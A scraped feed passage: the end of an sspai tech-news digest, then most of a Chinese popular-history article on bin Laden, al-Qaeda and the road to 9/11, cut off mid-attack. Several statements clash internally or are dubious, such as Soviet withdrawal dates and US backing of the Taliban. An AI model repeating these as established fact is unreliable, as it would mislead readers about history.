Abdul-Jabbar）、德克·诺维茨基（Dirk Nowitzki）和凯文·杜兰特（Kevin Durant）三位球星则将共同担任「NBA 75 周年纪念版」的封面球星。以上三个版本的 NBA 2K22 都将于今年 9 月 10 日在全球同步发售。<a href=\"https://www.gcores.com/articles/139248\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/15/article/b25e6d692d1f0b2f2282720366ab2d29\"><figcaption>图片来自新闻源</figcaption></figure><h2>Netflix 延长与环球影业动画电影的独家授权</h2>\n<p>流媒体平台 Netflix 近期与环球影业签订协议，确认环球旗下 Illumination 公司的动画作品将于 Netflix 独家播出，其中包含将于 2022 年上映的《小黄人：格鲁的崛起》（<i>Minions: The Rise of Gru</i>）等。Netflix 实际拥有的流媒体独占期为十个月，在 Illumination 的新电影上映后的四个月内，影片将首先在流媒体平台 Peacock 上播放，之后才由 Netflix 放映。十个月的 Netflix 独占期结束后，影片放映权将回到 Peacock 并再度持续四个月。最终在影片上映的十八个月后，该片可以出现在除 Netflix 和 Peacock 之外的流媒体平台上。此次协议中，双方还扩大了影片版权的范围，Netflix 将获得梦工厂（DreamWorks）旗下所有动画作品的独播权。<a href=\"https://www.engadget.com/netflix-exclusive-rights-universal-animated-films-105446842.html?src=rss\" target=\"_blank\">来源</a></p>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li>🤔 <a href=\"https://sspai.com/post/67698\" target=\"_blank\">或许也是你「入坑」的好机会：Obsidian 移动端上手体验</a>\n</li>\n<li>✍ <a href=\"https://sspai.com/post/67660\" target=\"_blank\">任务、笔记、日历三合一，你的全能时间管理工具：NotePlan 3</a>\n</li>\n<li>✈ <a href=\"https://sspai.com/post/67650\" target=\"_blank\">快乐飞旅行报告 10：我在乌鲁木齐吃了三顿烤包子</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67721"},{"title":"很认真地聊一下911事件","date":"2021-07-14 23:06:41","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-38cecfd53bb932e4d5ddb9e255f5af6e_l.jpg?source=8673f162\"><span>智先生，</span><span>有幸和你见证这个世界，公众号【智先生】</span>\n</div>\n<div>\n<p>我在动笔写 911 事件前，其实挺失望的，在翻遍了整个中文互联网后，除了无人问津的期刊论文，不管视频还是文章，真正有翔实有价值的内容并不多，屈指可数，大部分自媒体观点变成了简单归因，以偏概全。</p>\n<p>而且讨论热度最多的，是各种道听途说的阴谋论，没有亲自去查证任何数据资料，只要顶着一张外国脸出镜采访，所说出来的任何话就是真理一样，全盘相信那些纪录片，然后各种复制拼接，在中文互联网唬住一些信息不对称的读者。</p>\n<p>既然要很认真地聊，我只能花更多时间去挖掘原素材，翻遍了国外大量官方调查报告、国内外文献期刊资料，还有各种事件模拟报告、事件假说分析，甚至是电影纪录片作为参考，最终得以呈现一个更完整清晰，更具备前因后果的 911 事件。</p>\n<p> <br><br><strong>壹</strong><br><br>首先从本·拉登这个人讲起。<br><br>网上说他含着金汤匙出生，是富二代，这没问题。<br><br>他出生的时候，老拉登已经在沙特打下一片江山，和王室称兄道弟，政商界通吃，在建筑业顺风顺水，承包了大量政府工程，甚至还出任市政工程部长，拥有几十亿美元的资产（上世纪 70 年代）。<br><br>老拉登在 1967 年去世，当时本·拉登才 10 岁，在 55 个孩子中排第 17 位，地位不高，家族掌舵人是在他兄长手里。<br><br>有一种说法是，本·拉登拿到了几亿美元遗产。事实上，他根本没有分到多少遗产，老拉登也没有留下遗嘱，剩下的大部分资产，仍然要维持家族企业的运营。<br><br>他真正能动用的，是本·拉登家族的一个公共银行账户，整个家族成员都能支配使用，你也可以理解成零花钱账户，谁有需要就从里面拿。<br><br>本·拉登自从在全世界开始玩炮仗，家族就已经和他厘清了界限。所以直到今天，沙特本拉登集团还活得好好的，和基地组织创始人「本·拉登」没有任何关系。<br><br>其次是性格。<br><br>有文章说本·拉登从小声色犬马，流连于灯红酒绿的舞厅，甚至还为脱衣舞娘争风吃醋，又是在乱编。<br><br>不能因为这个人罪大恶极，就过分臆测他的私生活紊乱。<br><br>实际上，本·拉登整天沉默寡言，他经常独处，沉浸在宗教教义中，在家族里没有多少存在感。而且他不近女色，为了避免被异性吸引，在 17 岁时就选择结婚。<br><br>在他身上，伊斯兰的烙印非常深，从小接受原教旨主义的教育。<br><br>什么是原教旨主义？<br><br>你可以把它简单理解成，严格遵守某个宗教教条的群体，而且特别保守，排斥任何外来思想，会用信仰理念去指导一切现实。<br><br>它不局限于某个教，基督教，犹太教，天主教，佛教，伊斯兰教等等，甚至是各种主义各种流派，都会有原教旨主义。<br><br>如果你仔细分析就会发现，但凡某个地区的原教旨主义者越多，就意味着这个地区往往很落后，战乱频繁，贫富差距极大。<br><br>比如中东的许多伊斯兰国家，虽然宗教势力强势，仍然难以阻挡外来文化的入侵，尤其是世俗化进程的浪潮。当现代文明的开放自由与包容，和宗教思想的传统保守并存时，冲突就很难避免。<br><br>尤其中东国家的经济发展单薄，以石油为主线，看上去富丽堂皇，但世俗化的繁荣福利，并没有完全普及到中下层百姓身上，导致富者流油，穷者流血。<br><br>宗教势力不会眼睁睁看着世俗化浪潮冲破自己的一亩三分地，所以会将所有社会矛盾都推给世俗化，推给外来「邪祟文化」，然后制定各种严苛教条，比如女性要穿黑袍戴黑纱，禁酒禁猪肉，每天三四次祷告，公共场所约束举止等等，用《古兰经》来指导现实一切。<br><br>如此才能保持一个民族的「纯洁性」，这就是伊斯兰原教旨主义。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-46bbec3f2320475c6c4c441242a20613_b.jpg\" alt=\"\"></figure><p> <br><br>特别强调一下，伊斯兰原教旨主义不等于恐怖主义，里面也有保守温和的穆斯林，他们对恐怖分子特别憎恶。<br><br>或者说，我们不能把伊斯兰教看成一个整体，因为它主要分为两大派别，每个派别又有许多细分支派，非常凌乱。<br><br>历史渊源我这里就不展开了，只说下结论：<br><br>伊斯兰教大致可分为什叶派和逊尼派。<br><br>信奉什叶派的国家，主要是伊朗和伊拉克，对信徒的掌控力很强，一般没有脱缰野马般的疯子；<br><br>信奉逊尼派的国家，在中东占了绝大部分，像沙特等海湾国家，思想保守激化，信徒对外排斥，容易出乱子。<br><br>两个教派都认为自己是正宗的，是对方曲解了经文，互相看不对眼，常有矛盾冲突。<br><br>逊尼派下的一个分支叫瓦哈比派，这个教派更加极端，甚至会毁掉墓穴，因为他们认为，穆斯林应该只信仰真主安拉，不能哀悼死者。<br><br>他们还主张圣战，要将伊斯兰推向全世界，和所有世俗化国家为敌，并且只给异教徒两个选择，要么皈依，要么死亡。<br><br>只会打嘴炮的瓦哈比信徒，就是原教旨主义者；不仅打嘴炮，还在全世界放炮仗的瓦哈比信徒，就是恐怖分子。<br><br>那么，中东有哪个国家信奉瓦哈比派？<br><br>沙特，王室成员也全部是「虔诚信徒」，将瓦哈比奉为国教，在全国推广高压管理制度，以稳定政权。<br><br>本·拉登从小就在瓦哈比主义的熏陶中成长，身上的原教旨烙印特别深，他把宗教当成生命中最重要的东西，严格遵守教义，尤其体现在生活中。<br><br>他不允许家人使用任何电器，哪怕是在炎热潮湿的沙特吉达，也不能开空调、用冰箱。他的孩子患有哮喘，医生建议在家中备上万托林和吸入器，但本·拉登拒绝了，禁止使用任何现代处方药。<br><br>大学时期，他碰到了两位伊斯兰学者，其中一位是鼎鼎有名的「全球圣战之父」阿扎姆，他成为了本·拉登的导师。<br><br>可以说，大学时期的本·拉登，已经是标准的极端瓦哈比主义者，干柴火石碰到一起，没有一簇火花是无辜的。<br><br>1979 年，苏联入侵阿富汗，整个伊斯兰世界的自由战士同仇敌忾，全跑去支援阿富汗，成立各种「圣战组织」。<br><br>圣战这个词，在今天看来基本和恐怖主义没什么区别，可在当时，这些自由战士在西方眼里是对民主自由的追求，是对独裁的呐喊反抗，是英雄的化身。<br><br>这些自由战士里，包括了本·拉登。<br><br>他每天搜寻阿富汗新闻，忧心忡忡，认为有一股邪恶力量在控制穆斯林土地。<br><br>一开始，他忙于筹措资金，给阿富汗抵抗军提供支援，在清真寺和家族中筹到大量资金，然后购买食品、药品和武器，并组织司机开卡车把这些物资送到阿富汗人民手上。<br><br>沙特政府和人民也为阿富汗战争捐赠了大量资金，很多沙特男人自愿投入到战场中。<br><br>后来，本·拉登干脆辍学，和阿扎姆两人跑去阿富汗，成立了一个办公室，叫「帮助之家」，专门登记战士行踪，负责后勤运输和人员派遣。<br><br>弄了一段时间，本·拉登不满足于此，而是进一步参与圣战，建立训练营，成立自己的战斗小组，扛着枪与别人一起上战场，甚至让自己的大儿子进入战斗营，推向最前线。<br><br>每个人都知道拉登家族在阿富汗战场做出了很多努力，却没想到老拉登的儿子，竟然能冒着危险在前线战斗，感到十分震惊。<br><br>也因此，本·拉登成了战争英雄代表，受到许多沙特人和其他国家穆斯林的尊敬和爱戴。<br><br>美国在反苏战争中，提供了各种新式武器（有偿），本·拉登也成功进入了美国中央情报局的视野。<br><br>在美国眼里，他就是一名充满国际主义精神的英雄，听话懂事，指哪打哪，是一名坚定盟友；可在本·拉登眼里，美国就是下一个苏联，是伊斯兰世界的侵略者。<br><br>这期间发生了一件事。<br><br>1982 年，以色列入侵黎巴嫩，美国舰队从海上进行支援轰炸，整个黎巴嫩很快陷入战火，大量房屋摧毁，无数人流离失所，首都贝鲁特甚至出现了大屠杀。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b79e3487b28ba03451fa21d4b4441af8_b.jpg\" alt=\"\"></figure><p> <br><br>这件事让本·拉登深受震撼，他在之后的回忆中说：「当我看着黎巴嫩那些被拆毁的塔楼时，我想到我们应该摧毁美国的塔楼，让他们尝到我们的滋味。」<br><br>自始至终，本·拉登都对美国抱有极大敌意，但他很会掩饰自己，装成温顺听话的走狗，一边索要经费培训战士，一边发育自己的隐藏势力。<br><br>他从中央情报局学到了大量侦查、作战、审讯和谋略等知识，拿着美国划拨的大量经费，在阿拉伯世界修建十几处征兵基地，培训了几万名圣战组织者，用来抵抗苏联。<br><br>1988 年，本·拉登在阿富汗建立了基地组织，野望逐渐展露。<br><br>此时的苏联，已经准备撤军，败局已定。<br><br>反击战争的胜利，在美国人眼里，是自己和西方国家的人道主义干涉所致，本·拉登却认为，是《古兰经》的光辉仰仗，是伊斯兰战士浴血奋战的成果。<br><br>双方的理念，从抗击苏联这件事的立场，就已经有了不可弥合的矛盾。</p>\n<p> <br><br><strong>贰</strong><br><br>是什么导致了本·拉登和美国彻底翻脸？<br><br>因为海湾战争。<br><br>1989 年，苏联从阿富汗撤军后，本·拉登和追随者回到了沙特阿拉伯。<br><br>两伊战争也才刚刚结束，伊拉克和伊朗互相打得鼻青脸肿，伊拉克还欠下 800 亿美元外债，石油严重减产，经济大幅衰退。<br><br>萨达姆作为伊拉克总统，中东狂人之首，铁腕手段非凡，非常好战。<br><br>本·拉登不喜欢他，认为他没有在穆斯林土地上建立一个宗教政府，并非信徒，而且还嘲讽萨达姆，说他「一刻都停不下来去惹是生非」。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-7b539a60e3ad393a592881855b558fdc_b.jpg\" alt=\"\"></figure><p> <br><br>1990 年 2 月，萨达姆向科威特和沙特提出免除 400 亿美元的贷款，被拒绝了。<br><br>萨达姆又要求追加 300 亿美元无息贷款，并放言：「如果你们不给钱，那我就自己把它弄到手。」<br><br>他认为科威特只是一个小国，直接率领大军入侵科威特，花了两天时间就完全占领，却没想到整个阿拉伯世界沸腾起来。<br><br>伊拉克的军事实力很强，萨达姆的中东称霸计划更是昭然若揭，沙特担心下一个就轮到自己，以自身战五渣的士兵，再配上精良的美式装备，最终仍然等于战五渣的实力。<br><br>本·拉登知道王室的顾虑，他站出来表忠心，愿意带领手下一万两千名武装精良的老兵奔赴战场，以闪电般速度捍卫伊斯兰最神圣的土地。<br><br>本·拉登是战争英雄，人气极高，号召力强，这是王室所顾虑的，因此既没有答应， 也没有拒绝。<br><br>最终，沙特王室向美国发出邀约，请求军队驻扎。美国大感欣慰，因为这是入驻沙特、控制中东油气资源的最佳时机。<br><br>本·拉登成功被激怒：「难道萨达姆军队比苏联的还要厉害吗？不，我们不需要美国人！」<br><br>他认为沙特王室在犯罪，眼睁睁看着美国人亵渎圣地。可当时的他羽翼未满，势单力薄，单方面指责反对没有任何意义。<br><br>本·拉登对王室的忠诚很快变了。<br><br>1990 年秋天，美军大量涌入沙特，许多沙特男子感到被冒犯，本·拉登看到一排排女兵时，直接大骂，说竟然让女人来保卫沙特男人。<br><br>另一方面，美国和盟国在波斯湾陈兵 70 万，要打一场认真的战。<br><br>面对大军压境，萨达姆并不畏惧，因为从纸面数据来看，伊拉克的正规军接近百万，仅坦克就有 5600 辆，火炮 3800 门，飞机 770 架，他还断言：「美国连一万名士兵的死亡都承受不起。」<br><br>这是实情，美国国防部曾模拟海湾战争的伤亡数字，预估死亡人数在 1.7 万，并提前预备了数万个裹尸袋，大家都充满顾虑。<br><br>萨达姆没想到的是，美国根本没有在地面进攻的打算，全程玩空袭，派出战斧和夜鹰轻松越过防线，精准打掉了后方的雷达机场还有指挥部，所有飞机还没起飞就被轰成残骸。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-46461b57c31e207619822ff13b45564a_b.jpg\" alt=\"\"></figure><p> <br><br>整个空中打击持续了 42 天，到最后 100 小时，地面部队才进场收尸，美军基本没有伤亡。<br><br>海湾战争结束，全世界才发现自身和美国的真正代差，美国人也不知道自己竟然这么厉害，敌人会这么脆弱。<br><br>伊拉克虽然输了，国际联盟并没有赶尽杀绝，给萨达姆留下喘息空间，甚至还保留了不少军队实力。两万美军就这样顺理成章留在沙特，以防备伊拉克突袭。<br><br>本·拉登怒不可遏，在清真寺说：「美国士兵继续留在沙特， 这证明我预测完全正确，世俗污染已经蔓延开来了。」<br><br>沙特王室急忙站出来支持美国：「尽管美国人不是穆斯林，但他们是来保卫伊斯兰教的，所以理应得到我们的支持。」<br><br>如此一来，那些原教旨主义者，极端瓦哈比主义等势力，全部公开抗议，甚至主张推翻沙特王室的统治，认为沙特王室站在了美国以色列这边。<br><br>本·拉登给沙特国王写了一封信，指责王室背叛伊斯兰教义，是在引狼入室。<br><br>王室大怒，双方矛盾不可调和。<br><br>1991 年，本·拉登自知无法立足，逃亡到北非，去了苏丹。<br><br>这时期，本·拉登的远景目标有了彻底变化，那就是让中东地区彻底摆脱西方干涉，推翻君主政体和世俗政府，让伊斯兰教成为世界上唯一的宗教。<br><br>苏丹给了本·拉登一个安身之所。<br><br>出于感激，本·拉登制订了许多计划来改善苏丹经济，希望促使这个贫困潦倒的国家走向现代化。<br><br>他开始造厂、开公司、开办农耕项目和修路，并且说：「苏丹现在是我们的家，我会在这里过完余生。」<br><br>在苏丹政府的同意下，他在苏丹各地建立事训练营，广招圣战战士。他名声吸引了很多战士，训练营很快饱和。<br><br>为什么会有这么多战士投靠本·拉登？<br><br>一个主要原因是，这些人都是走投无路，被国家所抛弃的可怜人。<br><br>当年为了抵抗苏联入侵，阿拉伯各国将年轻战士送往前线。这些士兵积极响应号召，都放弃学业、事业还有婚姻，只为了支援穆斯林兄弟。<br><br>可在他们赢得战争后，这些国家抛弃了他们，因为害怕这些士兵掌握充分的军事知识后，会对国内的政权造成威胁，所以一律禁止入境。<br><br>这些战士变成了没有祖国的人，一部分成为阿富汗的地方军阀，另一部分投靠了本·拉登。<br><br>因为本·拉登从来没有忘记他们，也没有忘记自己的承诺，给了他们工作，提供高薪和住宿，让这些战士忠心耿耿。<br><br>沙特政府试图让本·拉登回国，向他提供了几个官职，唯一要求是让他停止批评王室，放弃军事活动，回国过安稳日子。<br><br>许多王子也纷纷来访，奉劝他回到沙特，连本·拉登家人也派来劝他，说他走的路很危险。<br><br>本·拉登对这种提议嗤之以鼻。<br><br>最后，国王传话给本·拉登，让他等着与国王亲自通话，可本·拉登拒绝通话，落了国王的颜面。<br><br>从此，本·拉登和沙特王室的关系完全破裂。<br><br>1992 年，克林顿上台。<br><br>他要面对的，是一个苏联已经解体的迷惘世界，像面团那样任人揉捏；而他要接手的，是一个经济军事强盛的美国，是全球民主灯塔。<br><br>1994 年 7 月，克林顿拿出第一份《国家安全战略报告》，提出了新目标：要在全球范围推进民主和人权。也就是后来著名的「人权高于主权」理论。<br><br>只要哪个国家的做法不够人权，不够民主，那美国就要去军事纠正一下，如果还不听话，让当局政府下台，换一个更民主的政府上来。<br><br>所以在某种程度上，克林顿和本拉登做的事情一样，左边人道主义，右边恐怖主义，都通过武力来对外干涉。<br><br>索马里政局动荡，美国跑去干涉，最后两架黑鹰直升机被击落，死了 19 人，尸体还被绳子拖着游街示众，灰溜溜撤出索马里，拍成了电影《黑鹰坠落》；</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0bc214bd556bf13b0923d207d8231ad4_b.jpg\" alt=\"\"></figure><p> <br><br>海地政局动乱，美国跑去干涉，组建了一个民选政府，让极少数人控制全国绝大部分财富，直到今天，海地依旧是那个北美烂疮；<br><br>南斯拉夫爆发民族矛盾，美国打了一场科索沃战争，投放大量贫铀弹，导致当地新生婴儿多发肿瘤和白血病，并成功狙击欧元，让 1 万亿资本回流美国。<br><br>卢旺达发生大屠杀，美国却没有人道干预了，因为那个地方太穷，没有任何资源或者战略价值。<br><br>90 年代末，还给中国带来四大恨，分别是银河号事件，台海危机，大使馆被炸，以及南海撞机事件。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-8e72c2b48338499a05b82400d78ff16d_b.jpg\" alt=\"\"></figure><p> <br><br>所以说，美国式的人道干涉，最终带来人道主义灾难。<br><br>本·拉登也在黑化的路上越走越远。<br><br>先是策划着谋杀约旦王储和罗马天主教教皇。<br><br>然后是也门首都的袭击事件，两家宾馆发生爆炸。美军是袭击目标，但成功躲过去了，两名奥地利游客不幸遇难。<br><br>1993 年 2 月，美国世贸中心北楼的地下停车场，一辆载有 680 千克炸药的卡车突然爆炸，炸药威力贯穿五层楼，造成六人死亡，一千多人受伤，这是世贸中心第一次恐怖袭击。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-1ed1d29be449bc434542a6bd30904b6f_b.jpg\" alt=\"\"></figure><p> <br><br>恐怖分子的最初设想，是要将其中一栋楼炸塌，然后撞倒另一栋楼，但炸药威力并没有这么夸张。最后，这些恐怖分子全被抓住，每人判了 240 年，他们和本·拉登的基地组织有千丝万缕的联系。<br><br>自从索马里的黑鹰坠落后，给了本·拉登更多自信。他认为，只要在各地炸死的人够多，制造恐怖袭击事件，就能逼迫美军从中东撤离，离开伊斯兰世界。<br><br>1995 年 11 月，沙特的一处美军军营发生爆炸，造成 5 人死亡；埃及驻巴基斯坦使馆爆炸，17 人丧生。<br><br>沙特本拉登集团，第一时间和本·拉登撇清关系，沙特王室也取消了他国籍，冻结所有财产。<br><br>这些举措对本·拉登伤害不大，他的大本营在苏丹，天高皇帝远，谁也管不着，他还说：苏丹政府慷慨给了我们公民身份。<br><br>美国虽然不敢再贸然踏上东非这片土地，但可以向苏丹政府施压。<br><br>本·拉登对美国的施压不关心。<br><br>他和苏丹政府有着错综复杂的联系，跟现任总统的关系不错，而且给政府带来大量利润，他相信苏丹无论如何也不会驱逐他。<br><br>但他错了。<br><br>1995 年 6 月 26 日，埃及总统穆巴拉克前往埃塞俄比亚首都时，一群枪手向总统专车开火。幸好司机车技高超，才救了总统的命。<br><br>六个杀手中有两人当场毙命，最终通过追踪刺杀者，调查人员发现杀手和基地组织有密切联系。<br><br>这次暗杀行动，许多北非国家恨透了本·拉登，一致向苏丹政府施压，要求驱逐基地组织。<br><br>一开始，苏丹政府提出将本·拉登交给沙特政府，但沙特不想审判一个被人民当成大英雄的家伙。<br><br>苏丹政府又想交给美国，美国也再三推诿，不想接这个烫手山芋，放弃了这个唯一逮捕本·拉登的绝佳机会。<br><br>苏丹的态度，让本·拉登既震惊又难过。<br><br>1996 年 5 月，本·拉登离开苏丹，去往了阿富汗，因为那里有一个新生政权能保他，那就是塔利班。</p>\n<p> <br><br><strong>叁</strong><br><br>塔利班的创始人叫奥马尔，是一所学校的普通老师。<br><br>1992 年，苏联撤出阿富汗后，这片土地并没有迎来和平，大量军阀割据混战，民不聊生。<br><br>对于这些军阀，奥马尔非常痛恨，他召集了 30 多名学生，一同组建了塔利班，发誓要拯救这个国家。他们纪律严明，作战英勇，从军阀手里救出了许多女孩，而且反对腐败，力图革新，获得最广大民众，尤其是普什图族的支持，这个拥有 1400 万人口的部落。<br><br>当然还有一些暗中势力支持，比如沙特阿拉伯和巴基斯坦，又给钱又给物资，很快让塔利班成为阿富汗最强大的武装势力。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-e8258e4cde3198419c059427fd61af29_b.jpg\" alt=\"\"></figure><p> <br><br>在美国的支持下，短短两年时间，塔利班占领了首都喀布尔，控制全国 90%的领土，取得了阿富汗政权。<br><br>可塔利班和本·拉登一样，都不受这些国家控制，它们只信仰伊斯兰原教旨主义，而且比基地组织更严格：不许听音乐， 不许唱歌、放风筝、养鸽子、看电视、看电影，妇女不能接受教育，男子不能剃须......<br><br>那么，塔利班为什么要庇护本·拉登？<br><br>因为本·拉登在阿富汗的声望很高，而且和奥马尔惺惺相惜，双方理念更是一拍即合。<br><br>就这样，没有后顾之忧的本·拉登，发起了更多恐怖袭击。<br><br>他们专门在叙利亚、阿富汗、沙特等国家的最偏僻农村建了不少学校，请来退休的圣战成员来讲课，教材就是《古兰经》，大量吸收原教旨主义信徒。<br><br>本·拉登即使被沙特开除国籍，被全世界围剿，可他在整个伊斯兰世界的底层百姓心中，仍然是一个伟大的战争英雄。<br><br>当人们听说本·拉登在阿富汗建立培训营后，很多人想加入。不久，本·拉登手下聚集了很多人，比以往任何时候都多，他们都愿意为了基地事业献出自己生命。<br><br>这其中有一部分是抗苏老兵，心怀崇高理想，希望恢复伊斯兰荣光；也有一些犯罪者，单纯为了躲避本国的法律制裁；还有一部分来自贫困家庭，他们结不起婚，与教义所宣传的早婚多子相违背，让他们羞愧难当，觉得自己生活在人间地狱，所以圣战信念很轻易征服他们，让他们寻求死亡，这样能快一点上天堂。<br><br>总的来说就是，这些年轻人并不畏死，他们相信死亡是一种奖励。<br><br>1996 年 8 月 23 日，他宣布向美国人开火，并袭击了一处沙特军营，炸死 19 名美军。<br><br>1997 年，开罗发生了一起客车爆炸案，又是基地组织干的。美国要求塔利班交出本拉登，塔利班高冷拒绝。<br><br>1998 年，本·拉登要求美国广播公司（ABC）对其进行采访。记者约翰米勒只身前往阿富汗山区，在一处藏匿地方对本拉登进行采访。<br><br>这段采访，本·拉登表达了几个观点：<br><br>1、美国带头对伊斯兰国家进行讨伐，除了干涉政务，还派遣数万名军队前往圣地，支持犹太人的扩张计划，完全控制阿拉伯半岛。<br><br>2、他们剥夺了我们的财富、资源和石油，杀害我们的兄弟，还侮辱我们的荣耀和尊严， 现在我们表达抗议，就被称为恐怖分子。<br><br>3、如果美国人民珍惜自己的生命，那就必须选一个满足他们利益、而不是犹太人利益的政府。如果再执迷不悟，那这场战斗将转移到美国本土，就像拉米兹·约瑟夫那样（93 爆炸案）。<br><br>4、我们不会区分军人还是平民，因为都是目标，纵观整个历史，美国人也不会区分军人还是平民，妇女和儿童。<br><br>基地组织二号人物扎瓦赫里告诉记者，几周后就可以看到结果了。<br><br>1998 年 8 月，美国驻坦桑尼亚和肯尼亚大使馆遭到炸弹袭击，214 人死亡，基地组织宣布负责；<br><br>2000 年 10 月，美国「科尔号」军舰发生爆炸，17 名美军死亡，基地组织宣布负责。<br><br>基地组织这般捣乱，让塔利班非常难堪，奥马尔亲自找到本·拉登，想让他离开阿富汗。<br><br>本·拉登知道他是一个虔诚的教徒，轻易说服了他：「首领，如果你迫于那些异教徒政府的压力让我们离开，那么你就违背了伊斯兰教教义。」<br><br>奥马尔听完后，只能同意让本·拉登继续停留，时间期限是一年半。剩余时间并不多，本·拉登只能加快圣战活动。<br><br>让人好奇的是，本·拉登要维持如此庞大的基地组织，他的资金从何而来。<br><br>一方面是在苏丹积累的原始资本，另一方面主要是靠施舍。<br><br>1994 年，沙特政府冻结了本·拉登的资产，但民间有大量人士，包括沙特的一些王室成员，家族的直系旁系亲属，都在暗中给基地组织捐过钱。<br><br>但沙特政府很快禁止了这条捐款网络，并且严密监视国内的资金动向。如此一来，本·拉登的最重要收入来源被砍断。<br><br>到 2000 年，基地成员在一个遗忘很久的箱子里发现五千美元，让本·拉登难得高兴起来，说这笔钱终于可以救急了，能在坎大哈的集市上买到很多食物，给大家填肚子。<br><br>随后，他的声音又充满悲伤：「我这一生从未想过，找到区区五千美元就能让我这么高兴。」<br><br>那么，本·拉登有没有在中国境内干过坏事？<br><br>有，但不是以基地组织的名义，而是资助东突伊斯兰运动，也就是东伊运，在中国新疆策划各种恐怖活动，试图分裂中国。<br><br>以前互联网上有一种流行谣言，说本·拉登在临死前千叮万嘱，绝对不能惹中国，因为中国的海关安检太严了。这些你图个乐子就好了，千万不要当真。<br><br>一个值得深思的点在于，哪怕全世界发生了多起恐怖袭击，哪怕基地组织的势力越来越大，可美国对基地组织的打击，始终没有用出狮子搏兔的力量，导致恐怖分子春风吹又生。<br><br>要说是美国故意纵容，说不过去，更可能的原因是，美国无法下决心斩掉基地组织的根基，也就是瓦哈比主义。<br><br>前面我已经说了，这个瓦哈比派，盛产本·拉登这种恐怖分子，但瓦哈比主义能在中东传播开来，和沙特在背后的支持分不开。沙特只有这样做，才能抵抗什叶派的扩张，抵抗伊朗和伊拉克。<br><br>对于沙特这种行为，美国一直纵容默许，希望借瓦哈比力量来遏制什叶派，最终的下场就是养虎为患，引火烧身。<br><br>一连串的小爆炸玩腻后，本·拉登盯上了世贸双子塔。<br><br>世贸双子塔是日本设计师山崎实的作品，之前他已经完成了沙特阿拉伯达兰机场的建筑设计，而这项工程被外包给本拉登建筑公司。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-b8960bae792b4ed8d2640ad3181bdffe_b.jpg\" alt=\"\"></figure><p> <br><br>山崎实在设计过程中，将许多伊斯兰元素融入进去，比如麦加广场和喷水池：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d64509486b2e509dbf7a41ff64c406c0_b.jpg\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-d0bb7943cf945d07f68c6aabc74bee3c_b.jpg\" alt=\"\"></figure><p> <br><br>大楼的外装饰钢材，像极了清真寺风格：</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-1fd4bd87322cd1f4d722e9c4c6faf273_b.jpg\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-117a97300a703b893946ee94a2f5fe15_b.jpg\" alt=\"\"></figure><p> <br><br>山崎实对自己的设计很满意，他说是对伊斯兰传统致以特别敬意，体现了美国对文化的包容和解构。<br><br>然而这种未经授权的行为，触犯了伊斯兰教的神谕，擅自将伊斯兰元素和商业文化结合起来，这是许多保守原教旨主义者不能忍的，必须接受惩罚。尤其是本·拉登，他就是搞建筑出身的，对这方面更为敏感。<br><br>另一方面，世贸双子塔本身存在了很多安全隐患。<br><br>它的最初构想，是一栋 80 层高的塔楼，和其它大厦持平，没有很突出。但港务局官员作为霸道甲方，要在一个 2 英亩的地皮上，保证 220 英亩的办公面积。占地面积小，办公面积又要大，对设计师来说，只能将楼层无限叠高，最终扩建成两栋 110 层高的双子塔楼。<br><br>这还不够甲方满意，每一层的办公空间也要最大化利用起来，增加可租售面积。<br><br>因此，世贸双子塔采用的是筒中筒结构，最大化利用室内空间，也就是由中间的 47 根巨型钢柱，和外墙的 240 根钢柱来承重：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c18d8be15014cc0478153f371f44d650_b.jpg\" alt=\"\"></figure><p> <br><br>大楼内部：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-8948fcfb348962ce5f814e5b55da7f1d_b.gif\" alt=\"\"></figure><p> <br><br>每一层的地板横梁，用的是很薄的钢板支撑。所以，你可以把它看成是由无数细碎的、像乐高积木一样的钢结构拼接起来的摩天大厦，它没有用传统的钢筋混凝土，因为这样更省钱。<br><br>只要防火材料做好，消防设施完善，哪怕是钢结构大厦也没多少问题。<br><br>坏就坏在，世贸双子塔的防火材料存在重大隐患，大部分钢柱位置都存在脱落现象，三十多年前甚至因为石棉问题引发官司。<br><br>这些地方如果没有防火材料保护，火灾一旦发生，哪怕没有到熔点，钢柱也很容易弯曲变形。港务局官员事后解释是，他们有想过修补，可大厦的核心部位和电梯周围难以维护到位。<br><br>防火材料有问题，那逃生通道呢？也有大问题。<br><br>在最初的楼体设计中，每栋楼都有六条逃生通道，而且分散在四个角落里，防止最中央出现拥挤堵塞。<br><br>但大厦建成后，紧急逃生通道缩减到三条，并且全部集中在中央位置，因为这样能减少内部的支撑柱，有更宽敞的租售空间，果然还是资本家聪明。<br><br>这些隐患，被一直保留下来。<br><br>2001 年 4 月，19 名劫机者来到美国，他们改成英文名字后，分散到了全美各地，在偏远郊区租公寓，报名学习如何开飞机。<br><br>几个月后，他们用现金购买机票，分别去往了三个机场。<br><br>9 月 11 日早上 8 点，行动正式开始。<br><br>8 点 46 分，美航 11 号航班遭到劫持，撞向世贸北塔：</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-ee930fa67550625bce37ba1f502e87f3_b.gif\" alt=\"\"></figure><p> 